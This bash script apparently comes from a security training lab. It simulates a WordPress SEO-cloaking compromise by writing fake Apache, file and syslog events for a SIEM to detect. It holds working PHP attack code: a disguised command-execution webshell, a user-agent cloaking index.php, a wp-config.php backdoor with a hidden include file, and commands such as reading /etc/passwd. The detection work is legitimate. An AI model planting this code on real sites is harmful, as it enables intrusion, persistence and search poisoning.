#!/bin/bash
# ============================================
# SEO Cloaking Parasite — Attack Simulation
# ============================================
# Mensimulasikan kompromi WordPress di shared hosting:
# 1. Recon — WPScan simulation
# 2. Exploit — Webshell upload
# 3. Cloak Deploy — Modify index.php + inject security.php
# 4. Googlebot Crawl — Simulasi crawl konten judi
# 5. Persistence — Backdoor di wp-config + cron simulation
# ============================================

SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/orchestrator.conf"
source "$SCRIPT_DIR/inject-common.sh"

ATTACKER_IP=$(random_ip)
DOMAIN="domain1.ac.id"
WEB_ROOT="/home/${DOMAIN}/public_html"
COUNT=$(get_attack_lines)

log_orch "scenario=SEO-CLOAKING target=${DOMAIN} attacker=${ATTACKER_IP}"

# ============================================
# PHASE 1: Reconnaissance (WPScan simulation)
# ============================================
log_orch "phase=RECON"

# WordPress version detection
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-admin/css/install.css" "200" "WPScan/2.0"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/readme.html" "200" "WPScan/2.0"

# User enumeration
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-json/wp/v2/users" "200" "WPScan/2.0"

# Plugin enumeration
for plugin in "akismet" "wordfence" "contact-form-7" "woocommerce" "elementor"; do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/plugins/${plugin}/readme.txt" "404" "WPScan/2.0"
done

# Theme enumeration
for theme in "blocksy" "twentytwentyfour" "twentytwentythree"; do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/themes/${theme}/style.css" "200" "WPScan/2.0"
done

# XML-RPC probe
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "POST" "/xmlrpc.php" "200" "WPScan/2.0"

# Directory busting
for path in "/wp-admin" "/wp-content" "/wp-includes" "/wp-config.php.bak" "/.env" "/.git/config"; do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "$path" "403" "dirbuster/1.0"
done

sleep 1

# ============================================
# PHASE 2: Initial Compromise (Webshell Upload)
# ============================================
log_orch "phase=EXPLOIT"

# Brute force wp-login
for pass in "admin123" "password" "123456" "admin" "telkom123"; do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "POST" "/wp-login.php" "200" "python-requests/2.31.0"
done

# Successful login
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "POST" "/wp-login.php" "302" "Mozilla/5.0"

# Upload webshell via plugin editor
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/wp-content/uploads/shell.php" \
    "<?php
// WordPress Security Check — DO NOT DELETE
if(isset(\$_REQUEST['cmd'])) {
    system(\$_REQUEST['cmd']);
}"

# Webshell access
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "POST" "/wp-content/uploads/shell.php" "200" "curl/7.88.1"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/uploads/shell.php?cmd=id" "200" "curl/7.88.1"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/uploads/shell.php?cmd=uname+-a" "200" "curl/7.88.1"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/uploads/shell.php?cmd=cat+/etc/passwd" "200" "curl/7.88.1"

sleep 1

# ============================================
# PHASE 3: Cloaking Deployment ⭐
# ============================================
log_orch "phase=CLOAK-DEPLOY"

# 3a. Backup original index.php → indexx.php
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/indexx.php" \
    "<?php
/**
 * Front to the WordPress application (ORIGINAL BACKUP)
 * @package WordPress
 */
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';"

# 3b. Modify index.php dengan cloak engine
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/index.php" \
    "<?php
\$user_agent = \$_SERVER['HTTP_USER_AGENT'] ?? '';
\$cloak_override = isset(\$_GET['cloak']);

if (\$cloak_override || preg_match('/googlebot|google|bing|yahoo|yandex|baidu|facebookexternalhit|twitterbot|slurp|duckduckbot/i', \$user_agent)) {
    \$cloak_file = __DIR__ . '/security.php';
    if (file_exists(\$cloak_file)) {
        include \$cloak_file;
        exit;
    }
}

\$legit_file = __DIR__ . '/index-legitimate.php';
if (file_exists(\$legit_file)) {
    include \$legit_file;
} else {
    echo '<h1>Akademi Ninja Konoha</h1><p>Portal Ninja</p>';
}"

# 3c. Create security.php — konten deface cloaking
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/security.php" \
    "<!DOCTYPE html>
<html>
<head>
<title>deface seo cloaking</title>
<meta name=\"description\" content=\"Mockup simulasi defacement SEO Cloaking untuk pembelajaran keamanan siber.\">
<meta name=\"robots\" content=\"index, follow\">
</head>
<body style=\"background:#0a0a1a;color:gold;font-family:Arial;text-align:center;padding:50px\">
    <h1>deface seo cloaking</h1>
    <p>Halaman ini adalah simulasi defacement untuk pembelajaran keamanan siber</p>
    <div style=\"background:#1a1a2e;padding:30px;border-radius:10px;margin:20px auto;max-width:600px\">
        <p>[SIMULASI] Halaman asli telah digantikan oleh konten berbahaya</p>
        <p>SEO Cloaking memungkinkan Googlebot melihat halaman berbeda dari visitor biasa</p>
        <p style=\"font-size:24px;color:lime\">INDIKASI DEFACEMENT TERDETEKSI</p>
        <p>Monitoring: Wazuh SIEM | Rule: FIM + SCA</p>
    </div>
    <p style=\"color:#666;margin-top:50px\">Copyright &copy; 2026 — Laboratorium Keamanan Siber</p>
</body>
</html>"

# 3d. Inject backdoor ke wp-config.php
inject_file_append "$AGENTS_SHARED" "${WEB_ROOT}/wp-config.php" \
    "
// SEO optimization cache layer
\$ua = \$_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/googlebot/i', \$ua)) {
    \$cache = dirname(__FILE__) . '/wp-content/uploads/.cache';
    if (file_exists(\$cache)) {
        include \$cache;
    }
}"

# 3e. Create .cache file (encoded payload) di uploads
inject_file_write "$AGENTS_SHARED" "${WEB_ROOT}/wp-content/uploads/.cache" \
    "<?php
// Cache layer — do not remove
\$f = dirname(__FILE__) . '/../security.php';
if (file_exists(\$f)) {
    include \$f;
    exit;
}"

sleep 1

# ============================================
# PHASE 4: SEO Poisoning — Googlebot Crawl
# ============================================
log_orch "phase=GOOGLEBOT-CRAWL"

# 4a. Googlebot crawls homepage — dapat konten judi
for ((i=0; i<5; i++)); do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "66.249.66.$((RANDOM % 255))" "GET" "/" "200" \
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
done

# 4b. Googlebot crawls data-alumni page
for ((i=0; i<3; i++)); do
    inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "66.249.66.$((RANDOM % 255))" "GET" "/data-alumni/" "200" \
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
done

# 4c. Googlebot crawls sitemap
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "66.249.66.1" "GET" "/sitemap.xml" "200" \
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "66.249.66.1" "GET" "/wp-sitemap.xml" "200" \
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# 4d. Googlebot crawls security.php directly
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "66.249.66.2" "GET" "/security.php" "200" \
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# 4e. Bingbot also gets cloaked content
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "40.77.167.1" "GET" "/" "200" \
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"

sleep 1

# ============================================
# PHASE 5: Verification — Normal User Access
# ============================================
log_orch "phase=VERIFICATION"

# Normal user (Chrome) — seharusnya dapat konten legitimate
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "10.0.0.50" "GET" "/" "200" \
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "10.0.0.51" "GET" "/data-alumni/" "200" \
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0.0.0"

# Attacker verifikasi cloak engine bekerja
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/" "200" \
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/?debug=cloak" "200" "curl/7.88.1"

# ============================================
# PHASE 6: Persistence Simulation
# ============================================
log_orch "phase=PERSISTENCE"

# Simulasikan cron job / systemd service via syslog
inject_syslog "13" "CROND" "[system] (root) CMD (/bin/bash -c 'if [ ! -f ${WEB_ROOT}/security.php ]; then cp /opt/backup/security.php ${WEB_ROOT}/security.php; fi')"
inject_syslog "13" "systemd" "Started Cache Optimization Service (jj.service)."
inject_syslog "13" "systemd" "cache-l.service: Service hold-off time over, scheduling restart."

# Attacker maintains access — periodic check via backdoor
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/uploads/shell.php?cmd=ls+-la" "200" "curl/7.88.1"
inject_apache_access "$AGENTS_SHARED" "$DOMAIN" "$ATTACKER_IP" "GET" "/wp-content/uploads/.cache" "200" "curl/7.88.1"

log_orch "scenario=SEO-CLOAKING phase=DONE files=6(index.php+indexx.php+security.php+shell.php+.cache+wp-config) lines=${COUNT} attacker=${ATTACKER_IP}"
